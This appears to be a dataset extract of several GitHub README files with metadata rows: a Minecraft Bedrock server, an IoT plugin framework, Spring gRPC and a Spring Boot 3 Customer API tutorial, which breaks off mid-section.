    <p> Figure 11 </p>
    <img src =""screenshots/3_create_product_by_user.PNG"">
    <p> Figure 12 </p>
    <img src =""screenshots/1_get_product_by_admin.PNG"">
    <p> Figure 13 </p>
    <img src =""screenshots/3_get_product_by_user.PNG"">
    <p> Figure 14 </p>
    <img src =""screenshots/3_get_products_by_user.PNG"">
    <p> Figure 15 </p>
    <img src =""screenshots/3_update_product_by_admin.PNG"">
    <p> Figure 16 </p>
    <img src =""screenshots/3_delete_product_by_admin.PNG"">
</details>


### Contributors

- [Sercan Noyan Germiyanoğlu](https://github.com/Rapter1990)",0,0,1,1.0,"['spring', 'boot', 'microservices', 'jwt', 'implementation', 'information', 'explore', 'rest', 'apis', 'technology', 'postman', 'prerequisite', 'define', 'variable', 'file', 'product', 'service', 'user', 'service', 'docker', 'run', 'maven', 'run', 'docker', 'image', 'location', 'screenshots', 'contributor']","['service', 'docker', 'run', 'spring', 'boot']"
sculkmp/Sculk,main,"<div align=""center"">
<img src=""https://static.wikia.nocookie.net/minecraft_gamepedia/images/e/e2/Sculk_%28pre-release%29.png"" width=""150"" height=""150"" alt=""Logo Sculk"">
<h4>Open source server software for Minecraft: Bedrock Edition written in Java</h4>

[![SculkVersion](https://img.shields.io/badge/version-soon-14191E.svg?cacheSeconds=2592000)]()
[![MinecraftVersion](https://img.shields.io/badge/minecraft-v1.21.21%20(Bedrock)-17272F)]()
[![ProtocolVersion](https://img.shields.io/badge/protocol-712-38D3DF)]()
[![Github Download](https://img.shields.io/github/downloads/sculkmp/Sculk/total?label=downloads%40total)]()
[![License](https://img.shields.io/badge/License-LGPL--3-yellow.svg)]()
[![JitPack](https://jitpack.io/v/sculkmp/Sculk.svg)]()

</div>

## 📖 Introduction
Sculk is open source server software for Minecraft: Bedrock Edition, It has a few key advantages over other server software:

## 🎯 Features
* Written in Java, Sculk is faster and more stable.
* We provided a high-level friendly API akin PocketMine plugin developers. Save yourself the hassle of dealing with the dot-and-cross of the low-level system API and hooks, we've done the difficult part for you!

## ✨ Creating plugins
Add Sculk to your dependencies *(it is hosted by JitPack, so you need to specify a custom repository)*.

For maven:
```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
<dependencies>
    <dependency>
        <groupId>com.github.sculkmp</groupId>
        <artifactId>Sculk</artifactId>
        <version>Tag</version>
    </dependency>
</dependencies>
```
For gradle:
```groovy
repositories {
    mavenCentral()
    maven { url 'https://jitpack.io' }
}
dependencies {
    implementation 'com.github.sculkmp:Sculk:Tag'
}
```

| Milestone                                | Status |
|------------------------------------------|--------|
| **⚒️ Construction of the server tree**   | ✅      |
| **👓 Visible server**                    | ✅      |
| **🛜 Join server**                       | ✅      |
| **🎍 World loader**                      | 🚧     |
| **🔌Plugin loader**                      | ⏳      |
| **⌨️ Command System**                    | 🚧     |
| **🔐 Permission System**                 | 🚧     |
| **🎈 Event System**                      | ⏳      |
| **🖼 Scoreboard API**                    | 🚧     |
| **🖼 Form API**                          | ✅      |
| **👤 Player & Actor API**                | ⏳      |
| **🔩 Item API**                          | 🚧     |
| **🧱 Block API**                         | 🚧     |
| **📦 Inventory API**                     | 🚧     |
| **🔬 Beta Testing & Community Feedback** | 🚧     |
| **🚀 Official Release & Support**        | 🚧     |

Here's a legend to guide you:
- ✅: Task is completed. Woohoo! 🎉
- 🚧: Task is under way. We're on it! 💪
- ⏳: Task is up next. Exciting things are coming! 🌠

## ⚒️ Build JAR file
- `git clone https://github.com/sculkmp/Sculk`
- `cd Sculk`
- `git submodule update --init`
- `mvn clean package`
The compiled JAR can be found in the `target/` directory.

## 🚀 Running
Simply run `java -jar Sculk-1.0-SNAPSHOT-jar-with-dependencies.jar`

## 🙌 Contributing
We warmly welcome contributions to the Sculk project! If you are excited about improving Minecraft 
Bedrock server software with Java, here are some ways you can contribute:

### Reporting bugs
If you encounter any bugs while using Sculk, please open an [issue](https://github.com/sculkmp/Sculk/issues) in
our GitHub repository. Ensure to include a detailed description of the bug and steps to reproduce it.

### Submitting a Pull Request
We appreciate code contributions. If you've fixed a bug or implemented a new feature, please submit a pull request!
Please ensure your code follows our coding standards and include tests where possible.

## 📌 Licensing information
This project is licensed under LGPL-3.0. Please see the [LICENSE](/LICENSE) file for details.

`sculkmp/Sculk` are not affiliated with Mojang. 
All brands and trademarks belong to their respective owners. Sculk is not a Mojang-approved software, 
nor is it associated with Mojang.",1,1,9,25.0,"['introduction', 'feature', 'creating', 'plugins', 'build', 'jar', 'file', 'run', 'contribute', 'report', 'bug', 'submit', 'pull', 'request', 'licensing', 'information']","['introduction', 'feature', 'creating', 'plugins', 'build']"
mqttsnet/open-exp-plugin,main,"<div align=""center"">

[![MQTTSNET Logo](./docs/images/logo.png)](http://www.mqttsnet.com)

</div>

## ThingLinks Open Exp Plugin | [中文文档](README_zh.md)

# Open Exp Plugin Overview

**Open-Exp-Plugin Sample Marketplace** is a plugin repository based on the ThingLinks Open EXP extension point plugin system. It is designed to demonstrate how to develop, extend, and integrate functionalities within the ThingLinks platform. This marketplace provides a variety of plugin examples to help developers quickly get started and understand the powerful capabilities and flexibility of the plugin system.

## Features

- **Plugin Architecture**: Demonstrates the ThingLinks plugin architecture, supporting various plugin development models.
- **Hot-Swappable Support**: Plugins support dynamic installation and uninstallation at runtime without restarting the main application.
- **Multi-Tenant Support**: Supports loading different plugins based on tenant ID for customized functionality.
- **Modular Design**: Plugins and the main application adopt a modular design, supporting the isolation and integration of extension points and plugins.
- **Classloader Isolation**: Provides Parent First and Self First classloader isolation mechanisms to ensure independence between plugins.

## Usage Example

### How to Use the Plugin Sample Marketplace

1. **Enable Dependencies and Select Plugins**: Enable the `example` related dependencies in the `pom.xml` file of the `open-exp-plugin` module.

   ![img_1.png](docs/images/img_1.png)

2. **Reload Projects**: Reload all Maven projects to ensure the dependencies are correctly loaded.

3. **Clean and Package**: Clean and package the `all-package` module.

   ![img_2.png](docs/images/img_2.png)

4. **After Packaging**: The plugin packages are by default generated in the `exp-plugins` directory.

   ![img_3.png](docs/images/img_3.png)

5. **Start the Main Application**: Run the `Main` class in the `example-springboot3` module.

   The main application will automatically load and install the packaged plugins. If you need to reinstall or uninstall plugins, simply call the relevant API.

### Notes

1. **Configuration Definition**: Plugin configurations should be defined in the `Boot` class.
   ![img_4.png](docs/images/img_4.png)
   Configuration usage:
   ![img_5.png](docs/images/img_5.png)

2. **MQTT Configuration**: In the `example-plugin-tcptomqtt` and `example-plugin-udptomqtt` plugins, MQTT server configurations should be adjusted according to the actual environment.
   ![img_8.png](docs/images/img_8.png)

3. **Annotation Import**: Ensure that the packages imported by the `@PostConstruct` and `@PreDestroy` annotations in the plugin's entry point are correct.
   ![img_7.png](docs/images/img_7.png)

## Core Features

- **Extension Point Interface**: Defines multiple extension point interfaces for plugins to implement.
- **Multi-Tenant Support**: Different tenants can use different plugin implementations, with support for tenant priority sorting and filtering.
- **Hot-Swappable Mechanism**: Supports dynamic loading and unloading of plugins, enhancing system extensibility and flexibility.
- **Classloader Isolation**: Ensures isolation between the plugin and the main application classloader, maintaining independence and security.

## License

[Apache License, Version 2.0](LICENSE)

## Contact

If you have any questions or need support, please contact the community team at mqttsnet@163.com.

## Source Code

The source code for this project is available at: [GitHub Repository](https://github.com/mqttsnet/open-exp-plugin)

## Join Us

We welcome you to join the **MQTTSNET Community**, where you can explore and promote IoT technology development together with developers from around the world. Through the community, you can access the latest technical information, rich development resources, and opportunities to communicate with other developers.

Visit the [ThingLinks Official Website](https://www.mqttsnet.com) for more information and to join our developer community!
",0,0,3,8.0,"['thinglinks', 'open', 'exp', 'plugin', 'open', 'exp', 'plugin', 'overview', 'feature', 'usage', 'example', 'how', 'use', 'plugin', 'sample', 'marketplace', 'note', 'core', 'feature', 'license', 'contact', 'source', 'code', 'join', 'u']","['plugin', 'open', 'exp', 'feature', 'thinglinks']"
spring-projects-experimental/spring-grpc,main,"# Spring gRPC [![build status](https://github.com/spring-projects-experimental/spring-grpc/actions/workflows/deploy.yml/badge.svg)](https://github.com/spring-projects/spring-grpc/actions/workflows/deploy.yml)

Welcome to the Spring gRPC project!

The Spring gRPC project provides a Spring-friendly API and abstractions for developing gRPC applications.

For further information go to our [Spring gRPC reference documentation](https://docs.spring.io/spring-grpc/reference/).

",0,13,1,10.0,"['spring', 'grpc', 'build', 'status', 'http', 'https']","['spring', 'grpc', 'build', 'status', 'http']"
pmoustopoulos/customer-api,main,"# Spring Boot 3 Knowledge Sharing

This document is designed to help new Spring Boot developers understand the basics of building applications using Spring
Boot 3. It covers the structure of a sample project [Customer API](https://github.com/pmoustopoulos/customer-api),
explains the purpose of key annotations, and provides insights
into best practices. **Note**: You have also to check the code example and not only this markdown file because some
parts
are not shown here (custom annotations, Utils class etc).

**Disclaimer**: This guide reflects my personal opinion and approach, based on the knowledge I have gained through my
work as a developer and my studies. It is not necessarily the best or only way to do things, and as time passes,
practices and tools may evolve. I encourage you to explore other perspectives and approaches as well.

**Feedback and Contributions**: I am always open to feedback and contributions. If you have suggestions for improvement
or additional insights, please feel free to share. Together, we can make this a valuable resource for anyone learning
Spring Boot 3.

## Table of Contents

1. [Introduction](#1-introduction)
2. [Project Structure Overview](#2-project-structure-overview)
3. [Introduction to Maven and `pom.xml`](#3-introduction-to-maven-and-pomxml)
4. [Key Annotations in Spring Boot](#4-key-annotations-in-spring-boot)
5. [Dependency Injection in Spring Boot](#5-dependency-injection-in-spring-boot)
6. [Design Patterns: RESTful API vs. MVC](#6-design-patterns-restful-api-vs-mvc)
7. [Naming Conventions](#7-naming-conventions)
8. [Configuring `application.yaml`](#8-configuring-applicationyaml)
9. [Detailed Package Breakdown](#9-detailed-package-breakdown)
   - [Entity Layer](#entity-layer)
   - [Repository Layer](#repository-layer)
   - [Service Layer](#service-layer)
   - [DTOs and MapStruct](#dtos-and-mapstruct)
   - [Controller Layer](#controller-layer)
   - [Exception Handling](#exception-handling)
10. [Helper Classes](#10-helper-classes)
11. [Testing](#11-testing)
12. [Best Practices](#12-best-practices)
13. [Enhanced Pagination Example](#13-enhanced-pagination-example)
14. [Appendix: Using
    `openapi-generator-maven-plugin` for API Client Generation](#14-appendix-using-openapi-generator-maven-plugin-for-api-client-generation)
15. [Feedback and Contributions](#15-feedback-and-contributions)

## 1. Introduction

### What is Spring Boot?

Spring Boot is an extension of the Spring framework that simplifies the development of Java applications. It provides
tools and conventions that allow developers to get started quickly without needing to manually configure and set up
complex frameworks.

### Why Use Spring Boot?

- **Auto-configuration**: Automatically configures your application based on the dependencies you add to your project.
- **Embedded Server**: You don’t need to set up an external server like Tomcat; Spring Boot applications can run with
  an embedded server.
- **Production-Ready**: Includes features like health checks, metrics, and externalized configuration, making it easy
  to deploy applications in a production environment.

---

## 2. Project Structure Overview

Understanding the structure of a Spring Boot project is crucial for effective development. Below is the typical
structure
of a sample Spring Boot 3 project. Please note this is something I follow based on the knowledge I gained from other
developers.
Furthermore, some packages can be skipped in case based on your use case you do not need them.

```
├── config
├── controller
├── dto
├── entity
├── enums
├── exception
├── filter
├── mapper
├── repository
├── service
│   └── impl
└── utils
```

### Packages and Their Purpose

- **`config`**: Contains configuration classes for application-wide settings (e.g., security, open api).
- **`controller`**: REST controllers handling HTTP requests, routing them to services (**note**: do not add logic here).
- **`dto`**: Data Transfer Objects (DTOs) used for transferring data between client and server.
- **`entity`**: JPA entities that represent database tables.
- **`enums`**: Enumerations used across the application.
- **`exception`**: Custom exceptions and a global exception handler.
- **`filter`**: Request filtering and logging logic.
- **`mapper`**: Classes that map entities to DTOs and vice versa. In this case I will use MapStruct for compile-time
  mapping.
- **`repository`**: Data access layer using Spring Data JPA repositories.
- **`service`**: Business logic layer, including interfaces and their implementations.
- **`utils`**: Utility classes and helpers used across the application.

---

## 3. Introduction to Maven and `pom.xml`

### What is Maven?

Maven is a powerful build automation and project management tool that is widely used in Java projects. It helps manage
project builds, dependencies, and configurations in a standardized way. Maven centralizes the project’s setup in a file
called the **Project Object Model (POM)**, which is typically located in the `pom.xml` file at the root of your project.

### What is a POM?

The **Project Object Model (POM)** is the core of a Maven project. It’s an XML file that defines the structure,
dependencies, and build configuration of your project. When Maven runs, it reads the `pom.xml` file to determine how to
build, test, and package your application.

### Key Concepts in the POM

#### Project Coordinates:

- **`groupId`**: Identifies your project’s group, typically following the reverse domain name pattern of your company or
  organization. For example, if your company’s domain is `ainigma100.com`, your `groupId` might be `com.ainigma100`.
  This convention helps to ensure uniqueness across all projects globally by using a domain that the organization owns
  or controls.
- **`artifactId`**: The name of your project or module (e.g., `customer-api`). It represents the artifact, which is
  usually the output of the project, such as a JAR file.
- **`version`**: The current version of your project (e.g., `0.0.1-SNAPSHOT`). It indicates the specific iteration of
  the project, helping in managing releases and dependencies.

#### Dependencies:

Dependencies define the external libraries your project needs to function. These are specified in the `<dependencies>`
section of the `pom.xml` and are automatically downloaded and included by Maven.

#### Plugins:

Plugins extend the functionality of Maven and are used to perform various build-related tasks, such as compiling code,
running tests, and packaging the application. They are specified in the `<build>` section of the `pom.xml`.

### Example `pom.xml` file for Customer API

<details>
  <summary>View pom file</summary>

```xml
<?xml version=""1.0"" encoding=""UTF-8""?>
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>3.3.2</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>

    <groupId>com.ainigma100</groupId>
    <artifactId>customer-api</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>customer-api</name>
    <description>customer-api</description>

    <properties>
        <java.version>21</java.version>
        <maven.compiler.source>21</maven.compiler.source>
        <maven.compiler.target>21</maven.compiler.target>
        <springdoc-openapi-starter-webmvc-ui.version>2.6.0</springdoc-openapi-starter-webmvc-ui.version>
        <org.mapstruct.version>1.6.2</org.mapstruct.version>
        <lombok-mapstruct-binding.version>0.2.0</lombok-mapstruct-binding.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-actuator</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-validation</artifactId>
        </dependency>
        <dependency>
            <groupId>com.h2database</groupId>
            <artifactId>h2</artifactId>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <optional>true</optional>
        </dependency>
        <dependency>
            <groupId>org.mapstruct</groupId>
            <artifactId>mapstruct</artifactId>
            <version>${org.mapstruct.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springdoc</groupId>
            <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
            <version>${springdoc-openapi-starter-webmvc-ui.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>${maven-compiler-plugin.version}</version>
                <configuration>
                    <source>${maven.compiler.source}</source>
                    <target>${maven.compiler.target}</target>
                    <annotationProcessorPaths>
                        <path>
                            <groupId>org.mapstruct</groupId>
                            <artifactId>mapstruct-processor</artifactId>
                            <version>${org.mapstruct.version}</version>
                        </path>
                        <path>
                            <groupId>org.projectlombok</groupId>
                            <artifactId>lombok</artifactId>
                        </path>
                        <path>
                            <groupId>org.projectlombok</groupId>
                            <artifactId>lombok-mapstruct-binding</artifactId>
                            <version>${lombok-mapstruct-binding.version}</version>
                        </path>
                    </annotationProcessorPaths>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>
```

</details>

### Dependencies Included

This `pom.xml` includes several important dependencies:

- **Spring Boot Starter Web**: Provides the necessary components to build a web application, including an embedded
  Tomcat server.
- **Spring Boot Starter Data JPA**: Simplifies database interactions by integrating Spring Data JPA for database
  operations.
- **Spring Boot Starter Actuator**: Adds production-ready features such as monitoring and metrics.
- **Spring Boot Starter Validation**: Facilitates data validation using Hibernate Validator. It allows you to use some
  annotations to validate an object.
- **H2 Database**: A lightweight in-memory database often used for testing and development.
- **Lombok**: Reduces boilerplate code by generating getters, setters, constructors, and other methods at compile time.
- **MapStruct**: A code generator that simplifies the mapping between Java beans.
- **SpringDoc OpenAPI**: Integrates Swagger/OpenAPI support into Spring Boot applications for API documentation.
- **Spring Boot Starter Test**: Provides testing libraries like JUnit, Mockito, and Spring TestContext Framework for
  unit and integration testing.

### Adding More Dependencies

As your project evolves, you might need additional libraries or tools. You can add more dependencies by searching for
them in the [Maven Central Repository](https://mvnrepository.com/) and including them in the `<dependencies>`
section of your `pom.xml`.

### Explanation of Plugin Configuration

In the `<build>` section of the `pom.xml`, we configure the Maven Compiler Plugin with additional settings for Lombok
and MapStruct:

- **Lombok**: Since Lombok generates code during the compilation phase (e.g., constructors, getters, setters), it
  requires an annotation processor. The plugin configuration ensures that Lombok's annotation processor is included,
  allowing Lombok to function correctly during compilation.


- **MapStruct**: MapStruct is a code generator that automatically creates mappers for converting between different
  Java beans. Like Lombok, MapStruct requires an annotation processor to generate the necessary code during compilation.
  The plugin configuration includes the MapStruct processor, ensuring that the mappings are generated correctly.


- **Lombok-MapStruct Binding**: MapStruct and Lombok both operate during the annotation processing phase, but they
  sometimes need to coordinate to avoid conflicts. The `lombok-mapstruct-binding` dependency ensures that Lombok's
  generated code is compatible with MapStruct, allowing both tools to work together seamlessly. This binding is
  configured in the `annotationProcessorPaths` section of the Maven Compiler Plugin, ensuring that the processors
  are run in the correct order.

By configuring these plugins, we ensure that Lombok, MapStruct, and their integration work seamlessly during the build
process, reducing manual coding effort and improving efficiency.

---

## 4. Key Annotations in Spring Boot

In this section, we’ll walk through the key annotations used across the various classes in the example project,
explaining their purpose and best practices. These annotations are essential for managing dependencies, handling HTTP
requests, mapping database entities, and more. Note that we will cover annotations specific to Spring Boot separately
from those provided by Lombok.

### 1. Spring Boot Annotations

These annotations are core to Spring Boot and are used throughout the application to define its structure and behavior.

#### 1.1 Dependency Injection and Component Scanning

- **`@Autowired`**: This annotation is used for automatic dependency injection. It can be applied to constructors,
  methods, fields, and even parameters to inject dependencies wherever they are needed, not just in service classes.
  When used on a constructor, it can be omitted if the class has only one constructor.

- **`@Component`**, **`@Service`**, **`@Repository`**, **`@RestController`**: These annotations are specializations of
  `@Component` and are used to define Spring beans. They indicate that a class is a Spring-managed component and can be
  automatically detected during component scanning. `@RestController` is a specialization of `@Controller` used for
  handling web requests and returning data directly as a response (usually JSON), combining the behavior of
  `@Controller` and `@ResponseBody`.

#### 1.2 Entity Class Annotations

- **`@Entity`**: Marks the class as a JPA entity, meaning it is mapped to a database table.
- **`@Table(name = ""customers"")`**: Specifies the table name in the database that this entity maps to.
- **`@Id`**: Denotes the primary key of the entity.
- **`@GeneratedValue(strategy = GenerationType.IDENTITY)`**: Specifies the primary key generation strategy.
- **`@Column`**: Marks a field as a column in the database. It can include attributes like `nullable`, `unique`, and
  `length`.
- **`@CreationTimestamp`** and **`@UpdateTimestamp`**: Automatically manage the creation and update timestamps of the
  entity.

#### 1.3 Controller Class Annotations

- **`@RestController`**: Combines `@Controller` and `@ResponseBody`, used to handle HTTP requests and return responses
  directly, usually as JSON. It is the preferred annotation for RESTful web services.

- **`@RequestMapping(""/api/v1/customers"")`**: Maps HTTP requests to specific methods in the controller, providing a base
  path for all endpoints within the controller.

- **`@GetMapping`, `@PostMapping`, `@PutMapping`, `@DeleteMapping`**: These annotations map HTTP GET, POST, PUT, and
  DELETE requests to specific methods in the controller, respectively.

- **`@Valid`**: Used to trigger validation of the request body or path variables based on constraints defined in the
  DTO.

- **`@RequestBody`**: Maps the HTTP request body to a Java object, commonly used in POST and PUT methods.

- **`@PathVariable`**: Binds a method parameter to a URI template variable, allowing extraction of values from the URL.

- **`@RequestParam`**: Binds a method parameter to a query parameter in the URL, useful for passing optional or required
  parameters to an endpoint.

#### 1.4 Configuration and Bean Management

- **`@Configuration`**: Indicates that the class contains Spring bean definitions and configuration settings.
- **`@Bean`**: Marks a method as a bean producer in Spring’s application context. This method’s return value is
  registered as a Spring bean.
- **`@Value`**: This annotation is used to pull configuration values from your properties file and inject them directly
  into your code.

#### 1.5. Event Handling

- **`@EventListener`**: This annotation is used to mark a method as an event listener, which listens for specific events
  within the Spring application lifecycle. For example, `@EventListener(ApplicationReadyEvent.class)` triggers when the
  application is ready to service requests.

### 2. Lombok Annotations

Lombok is a Java library that helps reduce boilerplate code by automatically generating common code like constructors,
getters, setters, etc. It is not part of Spring Boot but is often used alongside it for convenience.

- **`@Slf4j`**: Creates a `Logger` instance in the class, allowing for easy logging without manually defining a logger.

- **`@AllArgsConstructor`, `@NoArgsConstructor`, and `@RequiredArgsConstructor`**:
    - **`@AllArgsConstructor`**: Generates a constructor with parameters for all fields in the class.
    - **`@NoArgsConstructor`**: Generates a no-argument constructor.
    - **`@RequiredArgsConstructor`**: Generates a constructor for all final fields and any fields marked as `@NonNull`.

- **`@Data`**: Generates getters, setters, `equals()`, `hashCode()`, `toString()`, and other utility methods. While it
  is suitable for DTOs and simple data carrier classes, it is generally not recommended for JPA entities due to
  potential performance issues and complications with `equals()` and `hashCode()` methods.

- **`@Builder`**: Implements the builder pattern, making it easy to create immutable objects with only the required
  fields set.

### Additional Notes

There are many more annotations in Spring Boot that you might encounter as your application grows or as you write
tests (unit tests, integration tests, etc.). Each layer of the application (controller, service, repository, etc.) and
each use case (security, data validation, testing) has specific annotations that help to streamline development and
improve code quality. This section covers the key annotations used in this project, providing a solid foundation for
understanding how they work together in a Spring Boot application.

---

## 5. Dependency Injection in Spring Boot

Dependency Injection (DI) is a core concept in Spring that allows your classes to be loosely coupled. This means that
instead of your classes creating their dependencies, Spring will provide the dependencies they need. This makes your
code easier to manage, test, and maintain.

### Why Use Dependency Injection?

- **Simplifies Code**: You don’t need to create objects manually.
- **Easier Testing**: You can easily swap out dependencies with mock objects during testing.
- **Loose Coupling**: Your classes depend on abstractions (interfaces) rather than concrete implementations.

### Constructor Injection

Constructor injection is the preferred way to inject dependencies in Spring Boot. This means that you pass the
dependencies into a class through its constructor. This makes your classes more straightforward and ensures all
necessary dependencies are available when the object is created.

Here’s how it looks:

```java

@Service
public class CustomerService {

    private final CustomerRepository customerRepository;

    // Constructor Injection
    public CustomerService(CustomerRepository customerRepository) {
        this.customerRepository = customerRepository;
    }
}
```

In the example above, CustomerService depends on CustomerRepository. Spring automatically provides CustomerRepository
when creating a CustomerService instance.

### Using Lombok to Simplify Constructor Injection

In this project, I am using Lombok annotations to reduce boilerplate code. With Lombok, you can avoid writing
constructors manually by using the @RequiredArgsConstructor annotation. This automatically creates a constructor for all
final fields and autowires the dependencies.

```java

@Service
@RequiredArgsConstructor
public class CustomerService {

    private final CustomerRepository customerRepository;

    // Lombok automatically creates the constructor for you!
}
```

### The @Autowired Annotation

The `@Autowired` annotation tells Spring to automatically inject the required dependencies. In constructor injection, if
you have only one constructor, Spring will automatically inject dependencies without needing @Autowired.

#### Without using Lombok annotation

If you are not using Lombok, you can still use constructor injection like this:

```java

@Service
public class CustomerService {

    private final CustomerRepository customerRepository;

    @Autowired  // Optional with a single constructor
    public CustomerService(CustomerRepository customerRepository) {
        this.customerRepository = customerRepository;
    }
}
```

### Why Constructor Injection is Better

- **Clearer Dependencies**: It’s obvious which dependencies your class needs.
- **Immutable Fields**: Dependencies can be marked as `final`, ensuring they aren’t changed after they’re set.
- **Easier to Test**: You can easily provide mock dependencies when testing.

**Note:** Please search online for more details and try to understand this topic because it is important.

---

## 6. Design Patterns: RESTful API vs. MVC

When building applications with Spring Boot, it's essential to understand the different design patterns that can be used
to structure your application. The two most common patterns are **RESTful API** and **Model-View-Controller (MVC)**.
Each serves a different purpose and is chosen based on the needs of the application.

### 1. RESTful API (Service-Oriented Architecture)

- **Pattern Name:** **RESTful API** or **Service-Oriented Architecture (SOA)**
- **Annotation:** `@RestController`
- **Purpose:** The RESTful API pattern is designed to expose data and services over HTTP. In this architecture, the
  server does not concern itself with the presentation layer (UI). Instead, it focuses on delivering data, usually in
  JSON or XML format, which is consumed by a client (like a frontend framework such as Angular, React, or Vue.js).
- **Use Case:** This approach is ideal for applications where the frontend is developed separately from the backend. It
  allows for flexibility, as the frontend can be updated independently of the backend, and the same backend can serve
  multiple clients (web, mobile, etc.).

### 2. Model-View-Controller (MVC)

- **Pattern Name:** **Model-View-Controller (MVC)**
- **Annotation:** `@Controller`
- **Purpose:** The MVC pattern is a traditional approach where the server is responsible for both processing data and
  rendering the user interface. The `@Controller` annotation is used to handle HTTP requests and return views (typically
  HTML) that are rendered on the server side using templating engines like Thymeleaf.
- **Use Case:** MVC is suitable for monolithic applications where the server-side code manages both the business logic
  and the presentation logic. It’s often used in applications where the frontend is tightly coupled with the backend,
  and there's less need for a separate API layer.

### Differences Between RESTful API and MVC

- **Separation of Concerns:**
    - **RESTful API:** Decouples the backend from the frontend. The server provides data, while the client handles the
      presentation.
    - **MVC:** The server manages both data processing and presentation, offering a tightly integrated solution.

- **Flexibility:**
    - **RESTful API:** Offers greater flexibility as the backend can serve multiple types of clients, and the frontend
      can be updated independently.
    - **MVC:** Less flexible because the frontend and backend are tightly coupled, making it harder to update one
      without impacting the other.

- **Scalability:**
    - **RESTful API:** Easier to scale horizontally as the server's responsibilities are limited to providing data.
    - **MVC:** Can be more challenging to scale because the server handles both the data and the presentation logic.

- **Development Speed:**
    - **RESTful API:** Faster for teams working on large applications with separate frontend and backend teams.
    - **MVC:** Faster for small to medium-sized projects where one team handles both frontend and backend, and where
      integrating the two layers is straightforward.

### Choosing the Right Pattern

The choice between RESTful API and MVC depends on your project requirements:

- **Use RESTful API** if:
    - Your frontend is built with modern JavaScript frameworks.
    - You need to serve multiple types of clients.
    - You prefer a decoupled architecture that allows for more flexibility and easier maintenance.

- **Use MVC** if:
    - Your application is relatively simple, and the frontend is tightly coupled with the backend.
    - You want to leverage server-side rendering for better SEO or faster initial page loads.
    - You’re building a monolithic application where integrating UI and backend logic is straightforward and beneficial.

---

## 7. Naming Conventions

Consistent naming conventions in your codebase and API design make your project easier to navigate, maintain, and scale.
Below are some guidelines for naming conventions in a Spring Boot project focused on a customer-related API.

### Package Naming

- **Lowercase and Singular**: Package names should be in lowercase and singular. This enhances readability and
  consistency.
    - **Example**: `com.example.customerapi.controller`, `com.example.customerapi.service`
- **No Special Characters**: Avoid using special characters or underscores in package names. Stick to simple,
  descriptive names.
    - **Example**: `com.example.customerapi.repository` (not `com.example_customerapi.repository`)

### Class Naming

- **PascalCase**: Class names should follow PascalCase, where each word starts with an uppercase letter. This is a
  widely accepted convention in Java.
    - **Example**: `CustomerService`, `CustomerController`, `CustomerRepository`
- **Meaningful Names**: Choose descriptive names that clearly indicate the purpose of the class.
    - **Example**: `CustomerNotificationService` instead of `NotificationHelper`

### Entity Naming

- **Singular Form**: Entity classes should be named in the singular form to represent a single instance of the entity.
    - **Example**: `Customer`, `Address`, `Order`
- **Mapped to Plural Table Names**: Entities often map to plural table names in the database.
    - **Example**: `Customer` class maps to `customers` table, `Order` class maps to `orders` table

### API Endpoint Naming

- **Plural Nouns**: Use plural nouns for API endpoints to represent collections of resources.
    - **Example**: `/customers`, `/orders`, `/addresses`


- **Lowercase with Hyphens**: Endpoint paths should be lowercase, with hyphens separating words for readability.
    - **Example**: `/customers/{customerId}/orders`, `/orders/{orderId}/items`, `/customers/{customerId}/addresses`


- **Avoid Verbs in URIs**: Use nouns to represent resources. The HTTP method (GET, POST, PUT, DELETE) should define the
  action, not the URI.
    - **Bad Examples**: `/getCustomers`, `/createOrder`, `/deleteCustomer`
    - **Good Examples**: `/customers` (GET), `/orders` (POST), `/customers/{id}` (DELETE)


- **Use Forward Slashes (/) for Hierarchy**: Forward slashes are used to indicate a hierarchical relationship between
  resources.
    - **Example**: `/customers/{customerId}/orders`, `/customers/{customerId}/addresses`


- **Do Not Use Trailing Slashes**: Avoid trailing slashes at the end of the URI.
    - **Bad Example**: `/customers/`
    - **Good Example**: `/customers`


- **Use Query Parameters for Filtering**: When filtering collections, use query parameters instead of creating new
  endpoints.
  In some cases you may see filtering and sorting information provided as a payload inside a request body.
    - **Example**: `/customers?status=active`, `/orders?customerId=123&status=pending`

---

## 8. Configuring `application.yaml`

The `application.yaml` file is an essential configuration file in a Spring Boot project. It allows you to manage your
application's settings in a clear and structured manner. YAML is preferred over properties files in many cases because
it is easier to read and supports hierarchical data.

### Why `application.yaml`?

When you create a new Spring Boot project, the default configuration file is named `application.properties`. However,
many developers choose to use `application.yaml` instead, as it offers a more concise and readable format, especially
when dealing with complex configurations.

### General Configuration

The main `application.yaml` file typically includes common settings that apply to all environments, such as server
configuration, application name, and basic Spring settings.

### Environment-Specific Configuration

In addition to the main `application.yaml` file, you can create environment-specific YAML files, such as
`application-dev.yaml` for development, `application-uat.yaml` for user acceptance testing, and `application-prod.yaml`
for production. These files contains settings specific to each environment, allowing you to easily switch between
configurations without changing your code.

### Activating Profiles

You can activate a specific profile in several ways:

